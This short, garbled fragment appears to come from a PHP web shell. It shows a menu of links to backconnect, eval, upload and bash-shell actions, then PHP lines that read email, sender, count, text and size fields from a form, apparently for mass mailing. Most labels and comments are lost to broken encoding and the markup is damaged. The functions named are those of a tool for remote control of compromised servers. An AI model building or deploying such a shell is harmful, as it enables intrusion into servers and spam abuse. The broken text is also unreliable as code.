...
<A href="?ac=info" title='??  ?!'>[ ? ??/A> ][ <A href="?ac=navigation" title='  . ,  ...'></A> ][ <A href="?ac=backconnect" title='?backconnect ? ?'>??/A> ][ <A href="?ac=eval" title='    ? ?:)'>??/A> ][ <A href="?ac=upload" title='  ?  ,   ?  !'> </A> ][ <A href="?ac=shell" title='bash shell,? ...'>
...
$email=$_POST['email']; //  
$from=$_POST['from']; //  
$num=$_POST['num']; // ??$text=$_POST['text']; // ??$kb=$_POST['kb']; // ? (kb)
?>
